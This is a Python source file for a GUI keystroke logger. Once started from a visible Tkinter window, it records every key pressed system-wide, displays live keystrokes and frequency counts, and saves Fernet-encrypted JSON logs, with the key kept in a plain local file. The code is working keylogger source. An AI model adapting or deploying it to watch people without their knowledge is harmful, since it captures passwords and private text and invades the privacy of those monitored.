# Advanced Keylogger Monitoring Tool

import tkinter as tk
from tkinter import ttk
from pynput import keyboard
from datetime import datetime
import threading
import json
from cryptography.fernet import Fernet
import os

# ---------------- Encryption Setup ---------------- #
KEY_FILE = "secret.key"

def load_key():
    if not os.path.exists(KEY_FILE):
        key = Fernet.generate_key()
        with open(KEY_FILE, "wb") as f:
            f.write(key)
    else:
        with open(KEY_FILE, "rb") as f:
            key = f.read()
    return key

cipher = Fernet(load_key())

# ---------------- Logging Setup ---------------- #
session_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
log_file = f"logs_{session_time}.json"

key_data_list = []
key_count = {}
key_strokes = ""
running = False
listener = None

# ---------------- Utility ---------------- #
def format_key(key):
    try:
        return key.char
    except AttributeError:
        return str(key).replace("Key.", "")

# ---------------- Logging Functions ---------------- #
def save_encrypted_log(data):
    encrypted = cipher.encrypt(json.dumps(data).encode())
    with open(log_file, "wb") as f:
        f.write(encrypted)

# ---------------- Key Events ---------------- #
def on_press(key):
    global key_strokes

    k = format_key(key)

    entry = {
        "event": "press",
        "key": k,
        "time": str(datetime.now())
    }

    key_data_list.append(entry)

    # Update stats
    key_count[k] = key_count.get(k, 0) + 1
    key_strokes += k + " "

    update_dashboard()
    save_encrypted_log(key_data_list)


def on_release(key):
    if not running:
        return False

# ---------------- Thread Control ---------------- #
def start_logging():
    global running, listener
    if running:
        return

    running = True
    status_var.set("Running")

    def run():
        global listener
        with keyboard.Listener(on_press=on_press, on_release=on_release) as l:
            listener = l
            l.join()

    threading.Thread(target=run, daemon=True).start()


def stop_logging():
    global running, listener
    running = False
    status_var.set("Stopped")
    if listener:
        listener.stop()

# ---------------- Dashboard ---------------- #
def update_dashboard():
    text_box.delete(1.0, tk.END)
    text_box.insert(tk.END, key_strokes)

    stats_box.delete(1.0, tk.END)
    sorted_keys = sorted(key_count.items(), key=lambda x: x[1], reverse=True)

    for k, v in sorted_keys[:10]:
        stats_box.insert(tk.END, f"{k}: {v}\n")

# ---------------- GUI ---------------- #
root = tk.Tk()
root.title("User Activity Monitor")
root.geometry("600x400")

main_frame = ttk.Frame(root, padding=10)
main_frame.pack(fill="both", expand=True)

# Status
status_var = tk.StringVar(value="Stopped")
ttk.Label(main_frame, text="Status:").grid(row=0, column=0, sticky="w")
ttk.Label(main_frame, textvariable=status_var).grid(row=0, column=1, sticky="w")

# Buttons
ttk.Button(main_frame, text="Start", command=start_logging).grid(row=0, column=2)
ttk.Button(main_frame, text="Stop", command=stop_logging).grid(row=0, column=3)

# Keystroke Display
ttk.Label(main_frame, text="Live Keystrokes:").grid(row=1, column=0, sticky="w")
text_box = tk.Text(main_frame, height=10)
text_box.grid(row=2, column=0, columnspan=4, sticky="nsew")

# Stats
ttk.Label(main_frame, text="Top Keys:").grid(row=3, column=0, sticky="w")
stats_box = tk.Text(main_frame, height=8)
stats_box.grid(row=4, column=0, columnspan=4, sticky="nsew")

# Grid config
main_frame.rowconfigure(2, weight=1)
main_frame.rowconfigure(4, weight=1)
main_frame.columnconfigure(0, weight=1)

root.mainloop()

